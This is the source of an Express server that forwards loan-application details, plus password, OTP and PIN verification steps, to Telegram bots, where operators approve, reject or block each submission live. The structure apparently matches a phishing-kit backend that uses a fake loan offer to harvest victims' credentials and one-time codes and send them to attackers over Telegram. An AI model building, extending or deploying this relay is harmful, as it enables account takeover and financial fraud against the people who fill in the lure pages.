require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------------- MEMORY STORES ----------------
const passwordRequests = {};
const otpRequests = {};
const pinRequests = {};
const blockedRequests = {};
const requestMeta = {};
const loanRequests = {}; // <-- new store for loan approvals

// ---------------- MULTI-BOT STORE ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;

  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];

  if (token && chatId) {
    bots.push({ botId: `bot${i}`, token, chatId });
  }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- DEBUG ROUTE ----------------
app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
  });
});

// ---------------- BOT ENTRY ----------------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------------- HELPERS ----------------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.error('❌ Telegram error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id }
    );
  } catch {}
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
  if (!DOMAIN) return;
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
    );
    console.log(`✅ Webhook set for ${bot.botId}`);
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------------- PASSWORD / OTP / PIN STEPS ----------------
// ... keep your existing /submit-password, /check-password, /submit-otp, /check-otp, /submit-pin, /check-pin routes
// (no changes here)

// ---------------- NEW LOAN SUBMIT ----------------
app.post('/submit-loan', async (req, res) => {
  try {
    const { name, phone, amount, reference, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    loanRequests[reference] = null; // pending

    const buttons = [
      [
        { text: '✅ Approve Loan', callback_data: `loan_approve:${reference}` },
        { text: '❌ Reject Loan', callback_data: `loan_reject:${reference}` }
      ]
    ];

    await sendTelegram(
      bot,
      `💰 NEW LOAN REQUEST

👤 Name: ${name}
📞 Phone: ${phone}
💵 Amount: ${amount}
🆔 Ref: ${reference}`,
      buttons
    );

    res.json({ status: 'sent' });
  } catch (err) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ---------------- CHECK LOAN STATUS ----------------
app.get('/check-loan/:reference', (req, res) => {
  const result = loanRequests[req.params.reference] ?? null;
  res.json({ approved: result });
});

// ---------------- TELEGRAM CALLBACK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, id] = cb.data.split(':');
  const meta = requestMeta[id];

  // Existing flows
  if (action.startsWith('pass')) {
    if (action === 'pass_5') passwordRequests[id] = '5';
    if (action === 'pass_6') passwordRequests[id] = '6';
    if (action === 'pass_bad') passwordRequests[id] = false;
  }

  if (action.startsWith('otp')) {
    if (action === 'otp_ok') otpRequests[id] = true;
    if (action === 'otp_bad') otpRequests[id] = false;
    if (action === 'otp_6') otpRequests[id] = '6';
  }

  if (action.startsWith('pin')) {
    if (action === 'pin_ok') pinRequests[id] = true;
    if (action === 'pin_bad') pinRequests[id] = false;
    if (action === 'pin_block') blockedRequests[id] = true;
  }

  // NEW: loan approval / rejection
  if (action === 'loan_approve') {
    loanRequests[id] = true;
    await sendTelegram(bot, `✅ Loan approved for Ref: ${id}`);
  }

  if (action === 'loan_reject') {
    loanRequests[id] = false;
    await sendTelegram(bot, `❌ Loan rejected for Ref: ${id}`);
  }

  if (meta) {
    await sendTelegram(
      bot,
      `📝 ACTION TAKEN

👤 Name: ${meta.name || '—'}
📞 Phone: ${meta.phone || '—'}
${action.includes('loan') ? (action === 'loan_approve' ? '✅ Loan Approved' : '❌ Loan Rejected') : ''}`
    );
  }

  await answerCallback(bot, cb.id);
  res.sendStatus(200);
});

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
  app.listen(PORT, () =>
    console.log(`🚀 Server running on port ${PORT}`)
  );
});